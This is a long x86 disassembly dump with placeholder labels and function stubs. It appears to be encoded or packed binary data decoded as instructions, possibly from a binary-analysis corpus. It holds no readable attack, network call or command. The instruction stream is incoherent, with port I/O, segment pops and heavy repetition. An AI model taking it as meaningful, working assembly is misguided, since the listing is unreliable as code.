mov bh 0x93
xchg ebx eax
neg [ eax ]
xchg edx eax
jpe r-xdata
inc ebx
xchg esp eax
xchg ebx eax
xchg ebx eax
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sti
ja r-xdata
sbb dl bh
mov bh 0xa7
jpo r-xdata
adc bh dh
mov bh 0xbf
xchg ebx eax
lds edx [ ebp - 0x29 ]
mov bh 0x87
xchg edx eax
jpo r-xdata
popad
insb
insb
add eax [ ebx ]
add eax [ ebx ]
adc [ edi - 0x35 ] bh
shl [ eax + 0x1ac4c553 ] 0xd6
outsd
sbb dl dh
imul ebx [ edx ] 0xffffffd6
sub edx [ bp + di - 0x6c6d ]
rcr [ ecx + esi + 0x6c62587a ] cl
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
pop ss
pop ss
mov bl 0x93
xchg ebx eax
xchg ebx eax
insb
add eax [ ebx ]
add eax [ ebx ]
add eax ebx
insb
push 0x6c
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
mov al [ 0x1f7ad353 ]
outsd
insb
insb
adc bh dh
mov bh 0xb7
xchg ebx eax
0xd71a
sub_464b1f
pushfd
pop ss
test [ ebx + 0x6cc09393 ] edx
add eax 0x9393933f
sti
insb
xchg ebx eax
xchg ebx eax
xchg ebx eax
rol ch 0x7b
add eax 0x109393a6
push edi
lahf
stosb [ edi ]
iretd
sub_464b3d
mov bh 0x87
pushfd
pop ss
fwait
xchg ebx eax
xchg ebx eax
xchg ebx eax
sti
or ebp [ ecx - 0x3a936c6d ]
fwait
jpo r-xdata
xchg edx eax
xchg ebx eax
mov bl 0x93
xchg ebx eax
sbb [ ebx + 0x18 ] ch
push ebp
jpo r-xdata
sbb [ esi ] 0xffffffd7
mov bh 0x83
retn
mov dl 0xa5
les ebx [ edx ]
adc eax 0x9393932b
push ebx
pushfd
pop ss
push edi
popfd
xchg ebx eax
xchg ebx eax
jpe r-xdata
test [ ebx - 0x6d94ef6d ] edx
pushfd
push ss
xchg esp eax
xchg ebx eax
xchg ebx eax
xchg ebx eax
shr [ ebp + eax + 0x3f ] 0x93
xchg ebx eax
xchg ebx eax
jpo r-xdata
xchg ebx eax
xchg ebx eax
adc [ edx - 0x5 ] ch
xchg edx eax
xchg ebx eax
xchg ebx eax
sti
xor [ esi + 0x1ac48c70 ] bh
aad 0xbb
jpo r-xdata
xchg ebx eax
push ds
fimul [ ebx + 0x1e ]
salc
cmp edi [ ebx - 0x4f ]
movsd [ edi ] [ esi ]
xchg ebx eax
xchg ebx eax
push ss
mov esp 0x3039393
add eax [ ebx ]
add edi ecx
jpo r-xdata
xchg ebx eax
xchg ebx eax
xchg esi eax
xchg ebx eax
xchg ebx eax
adc [ ebx - 0x6e ] ch
pushfd
pop ss
inc edi
lea edx [ ebx - 0x48304d6d ]
xchg ebx eax
sti
jae r-xdata
mov edi 0x9392fd7b
sbb dl ch
xchg edx eax
xchg ebx eax
xchg ebx eax
add ebx 0xfffffff9
xchg ebp eax
sti
jpo r-xdata
insb
add eax [ ebx ]
sti
ror [ 0xffffffffae7a619a ] 0x60
insb
insb
add eax [ ebx ]
push ds
push ds
pop ds
outsb
insb
cmpsb [ esi ] [ edi ]
xchg ebx eax
xchg ebx eax
jpo r-xdata
xchg ebx eax
xchg ebx eax
sbb [ ebp + 0x7b ] dl
pushfd
jg r-xdata
sar [ edx + 0x4e ] cl
jbe r-xdata
add eax [ ebx ]
add eax [ ebx ]
stc
ja r-xdata
insb
cmc
sbb ch dh
add eax 0x93b8477a
xchg ebx eax
add ebx [ edx ]
inc edi
outsb
insb
insb
insb
lds eax [ ebx + 0x6c79867a ]
insb
add eax [ ebx ]
add ebp [ esp + eax + 0x7b ]
xchg ebx eax
xchg ebx eax
xchg ebx eax
adc [ edi - 0x55 ] dl
push ds
salc
inc ebx
jpe r-xdata
insb
sbb [ ebx + 0x10 ] cl
push edi
lahf
push ss
dec eax
pushfd
pop ss
cmp ecx [ ebp - 0x20e76c6d ]
mov bh 0x83
push ss
pop edx
pushfd
pop ss
jge 0x6a56df3e
insb
0x5316
pushfd
adc [ eax ] eax
lea edx [ ebx - 0x6393e96d ]
push ss
sbb [ ebp - 0x2fe16c6d ] cl
cmp [ edx + 0x5a ] 0xffffff81
xchg ebx eax
xchg ebx eax
les ebx [ edx ]
aad 0xbf
jpo r-xdata
sti
sub_465322
mov al 0x93
xchg ebx eax
add eax eax
sar [ edx + 0x3b ] 0x9f
xchg ebx eax
xchg ebx eax
pushfd
push ss
cwde
insb
insb
mov al [ 0x64947a53 ]
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sbb [ edx - 0xb ] dl
sbb dl dh
dec ecx
sbb [ ebp - 0xb ] dl
sbb dl dh
dec edi

sub_46541a
sbb [ edi + 0x7a ] bh
xchg ecx eax
outsb
insb
insb
jpe r-xdata
jae r-xdata
jbe r-xdata
sbb [ edi + 0x12 ] bh
jg r-xdata
insb
in eax 0xc7
insb
out 0x9b al
insb
out 0x6f al
insb
out 0x77 al
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ ecx + edx + 0x6c6c7d80 ]
push ds
salc
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
pop ss
cwde
xchg ebx eax
xchg ebx eax
xchg ebx eax
insb
out 0x7f al
sbb [ ebx + edi * 2 - 0x53 ] dl
mov al 0x93
xchg ebx eax
0x53a0
add eax [ ebx ]
add eax esi
cdq
xchg ebx eax
jpo r-xdata
insb
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add esi ebp
sbb dl dh
imul ebx [ esi ] 0x6c6e4716
adc [ ebx + 0x6c ] ch
pushfd
pop ss
sbb eax 0x6c93938d
out 0xb7 eax
add al 0xb
xchg ebx eax
xchg ebx eax
xchg ebx eax
stosb [ edi ]
into
lahf
jpe r-xdata
xchg ebx eax
rol ch 0xc4
sbb [ ebx - 0x60 ] ch
dec eax
test al 0x68
pushfd
pop ss
jmp r-xdata
mov edx 0x3039393
add eax [ ebx ]
add eax [ ebx ]
add eax esp
jpo r-xdata
push ds
pop ss
mov bh 0x33
xchg ecx eax
xchg ebx eax
xchg ebx eax
mov bh 0x93
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
test al 0x50
jpe r-xdata
insb
jpe r-xdata
insb
js r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
pop ss
pushfd
xchg ebx eax
xchg ebx eax
xchg ebx eax
dec edi
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add ebx [ eax ]
salc
fwait
jpe r-xdata
insb
jpe r-xdata
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ edi + edx - 0x6c6c6c64 ]
sahf
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
mov al [ 0x3505a53 ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi [ edx + 0x7c ]
mov eax [ 0x3039393 ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push ds
mov ebx 0x3039393
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
outsb
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
and al 0x99
sub al 0xc9
in al 0x93
xchg ebx eax
cmc
test al 0x5c
pushfd
pop ss
pop ds
mov ebx 0xea7a9393
lahf
jpe r-xdata
xchg esp eax
xchg ebx eax
xchg ebx eax
add ebx [ eax ]
push ebp
jpo r-xdata
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax esi
sbb [ edi - 0x3e ] bh
adc dh dh
outsd
xchg ebx eax
div [ edx ]
push ebx
xchg ebx eax
xchg ebx eax
xchg ebx eax
sbb dl dh
outsd
mov al [ 0xffffffff98497a53 ]
xchg ecx eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
adc eax 0x93939735
pushfd
and al 0x87
loop r-xdata
push ebp
jpe r-xdata
outsd
insb
insb
0x5316
sub edx [ ebx - 0x856c6d ]
jns r-xdata
insb
jpe r-xdata
sbb bl dh
arpl [ eax ] bx
pop ebx
stc
mov ebp 0x61de1af5
0xdc7a
push ecx
inc ebx
jpe r-xdata
les ecx [ edi + 0x7be66cc0 ]
insb
jl r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]

insb
sbb [ edi + 0x10 ] bh
jg r-xdata
xchg ebx eax
cwde
0x3039393 0x303
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx [ esi ]
pop edx
pushfd
pop ss
or cl [ ebx + edx * 4 + 0x61837b93 ]
0x39393bb 0x303
arpl [ esp + ebp * 2 + 0x3 ] bp
stc
add eax [ ebx ]
insb
add eax [ ebx ]
add eax [ ebx ]
les ebp [ edi - 0x49 ]
fwait
sbb [ ebx + 0x6c ] ch
jpo r-xdata
push ds
salc
retn
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
les edi [ ebx + 0x3 ]
je r-xdata
jb r-xdata
push ss
out dx eax
outsb
insb
insb
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi ]
cmc
std
cmc
sbb bl dh
jge r-xdata
mov ah [ ebx + 0x6c ]
insb
add edi ecx
insb
insb
push ss
push ebx
jpe r-xdata
popad
salc
outsd
idiv edi
call [ ebx + 0x64ebc36c ]
dec ebx
mov [ ebx + 0x64 ] dl
dec ebx
pop edx
push eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ eax ]
dec ebx
cmc
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sbb [ edi + 0x12 ] bh
jg r-xdata
sbb cl dh
lahf
sbb [ edx + 0x7a ] cl
adc [ bp + di + 0x393 ] 0x3
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ecx ebx
cmc
sbb dl dh
mov al [ gs : 0xffffffff96ad7a53 ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add edi ecx
r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sbb [ ebx - 0xb ] cl
mov bh 0x93
xchg ebx eax
add esi ebp
sbb dl dh
inc ecx

xchg ecx eax
xchg ebx eax
xchg ebx eax
sar [ edx + 0x4 ] 0x73
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ecx esp
cmc
sbb ch dh
jg r-xdata
hlt
sub_465523
not [ eax ]
imul ebp [ esp + ebx * 4 + 0x17 ] 0x1d
lea edx [ ebx - 0x4818936d ]
lahf
jpe r-xdata
push ds
pop ss
mov bh 0x33
xchg ecx eax
xchg ebx eax
xchg ebx eax
mov bh 0x93
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
test al 0x50
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
pop ss
pushfd
xchg ebx eax
xchg ebx eax
xchg ebx eax
dec edi
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add ebx [ eax ]
salc
fwait
jpe r-xdata
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ edi + edx - 0x6c6c6c64 ]
sahf
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
mov al [ 0x3505a53 ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi [ edx + 0x7c ]
mov eax [ 0x3039393 ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push ds
mov ebx 0x3039393
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
outsb
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
and al 0x99
sub al 0xc9
in al 0x93
xchg ebx eax
cmc
test al 0x5c
pushfd
pop ss
pop ds
mov ebx 0xea7a9393
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax esi
sbb [ edi - 0x3e ] bh
adc dh dh
outsd
xchg ebx eax
div [ edx ]
push ebx
xchg ebx eax
xchg ebx eax
xchg ebx eax
sbb dl dh
outsd
mov al [ 0xffffffff98497a53 ]
xchg ecx eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
adc eax 0x93939735
pushfd
and al 0x87
loop r-xdata
sub edx [ ebx - 0x856c6d ]
jns r-xdata
insb
jpe r-xdata
sbb bl dh
arpl [ eax ] bx
pop ebx
stc
mov ebp 0x61de1af5
0xdc7a
push ecx
inc ebx
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]

insb
sbb [ edi + 0x10 ] bh
jg r-xdata
xchg ebx eax
cwde
0x3039393 0x303
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx [ esi ]
pop edx
pushfd
pop ss
or cl [ ebx + edx * 4 + 0x61837b93 ]
0x39393bb 0x303
arpl [ esp + ebp * 2 + 0x3 ] bp
stc
jpo r-xdata
push ds
salc
retn
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
les edi [ ebx + 0x3 ]
je r-xdata
jb r-xdata
push ss
out dx eax
outsb
insb
insb
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi ]
cmc
std
cmc
sbb bl dh
jge r-xdata
mov ah [ ebx + 0x6c ]
insb
add edi ecx
insb
insb
push ss
push ebx
jpe r-xdata
popad
salc
outsd
idiv edi
call [ ebx + 0x64ebc36c ]
dec ebx
mov [ ebx + 0x64 ] dl
dec ebx
pop edx
push eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ eax ]
dec ebx
cmc
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sbb [ edi + 0x12 ] bh
jg r-xdata
sbb cl dh
lahf
sbb [ edx + 0x7a ] cl
adc [ bp + di + 0x393 ] 0x3
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ecx ebx
cmc
sbb dl dh
mov al [ gs : 0xffffffff96ad7a53 ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add edi ecx
r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sbb [ ebx - 0xb ] cl
mov bh 0x93
xchg ebx eax
add esi ebp
sbb dl dh
inc ecx

xchg ecx eax
xchg ebx eax
xchg ebx eax
sar [ edx + 0x4 ] 0x73
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ecx esp
cmc
sbb ch dh
jg r-xdata
hlt
sub_4657ac
sbb [ edi - 0x3c ] bh
stc
xchg edi eax
sti
xchg ebx eax
mov [ 0xffffffffe66c9393 ] eax
lahf
stc
xchg ebx eax
insb
add edx [ ebx ]
xchg ebx eax
xchg ebx eax
xchg ebx eax
sbb [ ebx + 0x16 ] ch
cmc
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
les ebx [ edx ]
adc eax 0x9393933b
jpo r-xdata
sbb cl dh
ja r-xdata
sbb [ ebx - 0x60 ] cl
inc ecx
stc
in al 0xf5
sbb al dh
rcr [ eax ] 0x1
dec edx
leave
cmc
insb
lds ebx [ ebx + 0x6c49667a ]
insb
insb
adc [ edi - 0x2d ] dl
sti
inc eax
mov [ 0x1ac4c555 ] al
adc eax 0x9393933f
jpo r-xdata
sbb ch dh
jpe r-xdata
insb
pushfd
pop ss
movsd [ edi ] [ esi ]
xchg ebp eax
xchg ebx eax
xchg ebx eax
jpe r-xdata
push ss
insb
insb
sti
enter 0x19e6 0x63
les ebx [ edx ]
aad 0xdf
jpo r-xdata
sbb cl dh
jne r-xdata
dec ebx
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi [ edx + 0x44 ]
push 0x6c
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
0x5316
insb
dec cx
insb
insb
insb
sbb [ ebx - 0x5 ] cl
not [ 0x7ac4e660 ]
or dh [ ebx + 0x6c ]
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
cmc
sbb al dh
lodsd [ esi ]
sbb [ ebx + 0x18 ] ch
inc ebx
cmc
sbb cl dh
jno r-xdata
sbb ch dh
mov al [ 0xfffffffffffff56c ]
sbb al dh
rcr [ eax ] cl
dec ebx
mov al [ 0xfffffffff5e4f941 ]
sub_465895
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esp - 0x29936a2b ]
imul edx [ eax ] 0xffffffd6
outsd
mov ebx 0xd6aacaca
imul edi [ edx - 0x3a ] 0x7b
insb
insb
retn
sub_465965
les edi [ edx - 0x53 ]
jno r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
retn
insb
add eax [ ebx ]
add edi ebx
bound ecx [ esi + 0x256cd3fa ]
push edi
xchg ebx eax
xchg ebx eax
xchg ebx eax
jpe r-xdata
add esi ebp
adc [ edx - 0x31 ] ch
jpe r-xdata
pushad
insb
insb
retn
ja r-xdata
xchg ebx eax
stc
xchg edi eax
jpe r-xdata
insb
pop edx
push eax
add ecx edx
0x16cc
jpe r-xdata
jle r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
cmc
insb
insb
mov al [ 0x505ad353 ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax ebx
lds ebp [ esp + eax * 8 - 0x3d ]
int3
push esp
salc
pop edi
sti
0x767af6e3 0x6c71
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pop edx
push eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi ]
out dx al
pop ebx
jpe r-xdata
add edx ebp
test al 0x63
pushfd
adc ecx ecx
push 0xd37b6c6c
fwait
xchg ebx eax
xchg ebx eax
sbb [ ebx - 0x58 ] ah
pushad
pushfd
pop ss
iretd
xchg edi eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
mov eax 0xdb7a9393
mov ch 0x93
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push esp
salc
sub ecx ebx
idiv ch
lds edx [ esi + edx * 8 + 0x2f ]
jle r-xdata
insb
insb
sti
xchg ebx eax
fwait
xchg ebx eax
xchg ebx eax
jpe r-xdata
insb
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi + edx - 0x6c6c6c63 ]
adc [ ecx - 0x6f ] dl
cmc
adc [ edi + 0x169c9382 ] ch
inc edx
add eax [ ebx ]
add eax [ ebx ]
cmc
push ss
inc ecx
jpe r-xdata
mov eax 0x3039393
add eax [ ebx ]
retn
sub_465998
push ebx
pushfd
push ss
jns r-xdata
xchg ebx eax
adc ch [ 0xffffffff9393932f ]
xchg edx eax
xchg ebx eax
xchg ebx eax
pushfd
pop ds
fwait
xchg ebx eax
xchg ebx eax
xchg ebx eax
stc
xchg ebx eax
insb
add eax 0x9393933f
push ds
push ds
imul ebp [ esi + 0x6c ] 0x6c
jpe r-xdata
xchg ebx eax
xchg ebx eax
push ds
salc
jpo r-xdata
les ebx [ esi ]
pop ss
mov bh 0x2f
xchg ecx eax
xchg ebx eax
xchg ebx eax
mov dh 0x93
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
lds ebx [ esi ]
push ds
pop ds
outsb
insb
insb
jpo r-xdata
inc ebx
0x3039393 0x303
add esp [ eax + 0x727ad353 ]
mov ah 0x93
jno r-xdata
insb
jne r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
retn
insb
add eax [ ebx ]
add edi ebx
bound ecx [ esi + 0x256cd3fa ]
push edi
xchg ebx eax
xchg ebx eax
xchg ebx eax
jpe r-xdata
jpe r-xdata
insb
jpe r-xdata
add esi ebp
adc [ edx - 0x31 ] ch
jpe r-xdata
pushad
insb
insb
add edx ebp
test al 0x63
pushfd
adc ecx ecx
push 0xd37b6c6c
fwait
xchg ebx eax
xchg ebx eax
sbb [ ebx - 0x58 ] ah
pushad
pushfd
pop ss
iretd
xchg edi eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
push ss
lds edi [ edx - 0x47 ]
mov [ ebx + 0x3030393 ] ss
add eax [ ebx ]
add eax [ ebx ]
add ebx [ edi + edx + 0x6c6c4e87 ]
retn
ja r-xdata
mov eax 0xdb7a9393
mov ch 0x93
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push esp
salc
sub ecx ebx
idiv ch
lds edx [ esi + edx * 8 + 0x2f ]
jle r-xdata
xchg ebx eax
stc
xchg edi eax
jpe r-xdata
insb
pop edx
push eax
add ecx edx
0x16cc
insb
insb
sti
xchg ebx eax
fwait
xchg ebx eax
xchg ebx eax
jpe r-xdata
insb
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi + edx - 0x6c6c6c63 ]
adc [ ecx - 0x6f ] dl
cmc
adc [ edi + 0x169c9382 ] ch
inc edx
jpe r-xdata
jle r-xdata
add eax [ ebx ]
add eax [ ebx ]
cmc
push ss
inc ecx
jpe r-xdata
mov eax 0x3039393
add eax [ ebx ]
retn
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
cmc
insb
insb
mov al [ 0x505ad353 ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax ebx
lds ebp [ esp + eax * 8 - 0x3d ]
int3
push esp
salc
pop edi
sti
0x767af6e3 0x6c71
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pop edx
push eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi ]
out dx al
pop ebx
sub_465a7a
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx ebp
test al 0x63
pushfd
adc ecx ecx
push 0xd37b6c6c
fwait
xchg ebx eax
xchg ebx eax
sbb [ ebx - 0x58 ] ah
pushad
pushfd
pop ss
iretd
sub_465a97
inc edi
add eax [ ebx ]
add eax [ ebx ]
cmc
push ss
inc ecx
jpe r-xdata
mov eax 0x3039393
add eax [ ebx ]
retn
mov eax 0xdb7a9393
mov ch 0x93
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push esp
salc
sub ecx ebx
idiv ch
lds edx [ esi + edx * 8 + 0x2f ]
jle r-xdata
insb
insb
sti
xchg ebx eax
fwait
xchg ebx eax
xchg ebx eax
jpe r-xdata
insb
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi + edx - 0x6c6c6c63 ]
adc [ ecx - 0x6f ] dl
cmc
adc [ edi + 0x169c9382 ] ch
inc edx
sub_465ab5
dec ecx
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add esp [ eax + 0x7a87f953 ]
push edx
dec esi
insb
insb
add eax ebx
push ds
pop ss
mov bh 0xb
xchg ebx eax
xchg ebx eax
xchg ebx eax
retn
sub_465af3
stc
jecxz r-xdata
jb r-xdata
xor [ ebx + 0x6c ] edi
insb
jpe r-xdata
pushfd
adc [ ebx + 0x4e ] edi
insb
insb
insb
sti
das
dec eax
cmp [ esi ] ch
les ebx [ edx ]
sub eax 0x93939357
sbb cl [ 0xffffffff93939313 ]
jpo r-xdata
insb
insb
0x7aca
dec edi
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add ebp [ eax + 0x79179c50 ]
inc eax
insb
insb
mov al [ 0x7a50a865 ]
pop ecx
imul ebp [ esp + ebp * 2 - 0x7 ] 0xd61af5e0
dec ebx

push ss
insb
pushfd
pop ss
0x939d
push ebx
int 0xc8
push eax
add eax [ ebx ]
add eax [ ebx ]
